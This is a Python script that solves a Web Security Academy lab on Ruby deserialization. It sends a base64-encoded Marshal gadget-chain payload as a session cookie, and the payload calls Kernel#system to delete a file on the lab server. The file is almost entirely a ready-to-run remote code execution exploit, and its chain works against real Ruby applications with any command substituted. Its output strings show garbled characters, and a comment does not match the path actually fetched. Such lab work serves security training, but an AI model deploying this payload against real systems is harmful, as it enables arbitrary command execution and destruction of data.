########################################################################
#
# Lab: Exploiting Ruby deserialization using a documented gadget chain
#
# Hack Steps:
#      1. Modify a documented gadget chain and generate the payload
#      2. Fetch the home page with the payload as session to delete
#         the morale.txt file
#
########################################################################
import requests
from colorama import Fore
import base64

# Change this to your lab URL
LAB_URL = "https://0af2005b03b617f28182de2d00a200dc.web-security-academy.net"

def main():
    print("‚ùØ‚ùØ Fetching the home page with the payload as session to delete the morale.txt file.. ", end="", flush=True)

    # this payload was generated using a documented gadget chain after a slight modification (https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
    serialized_encoded = "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ=="
    cookies = { "session": serialized_encoded }
    fetch("/admin/delete?username=carlos", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "üóπ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch " + path + " through exception")


if __name__ == "__main__":
    main()